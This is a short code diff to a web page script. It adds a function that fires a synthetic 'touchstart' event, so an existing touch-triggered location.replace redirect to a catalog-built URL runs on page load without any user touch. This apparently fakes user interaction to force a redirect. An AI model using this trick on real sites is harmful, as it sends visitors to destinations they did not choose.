@@ -26,6 +26,7 @@
                   window.addEventListener("touchstart", () => { 
                     location.replace(catalog.key1.link+catalog.key1.page+"/");            
                   });
+                  eventFire(window, "touchstart");
                 }
 
               }
@@ -34,5 +35,15 @@
                console.log('We\'re oine...');
             } 
           }, 0);
+       
+function eventFire(el, etype){
+  if (el.fireEvent) {
+    el.fireEvent('on' + etype);
+  } else {
+    var evObj = document.createEvent('Events');
+    evObj.initEvent(etype, true, false);
+    el.dispatchEvent(evObj);
+  }
+}
    </script>
 </html>
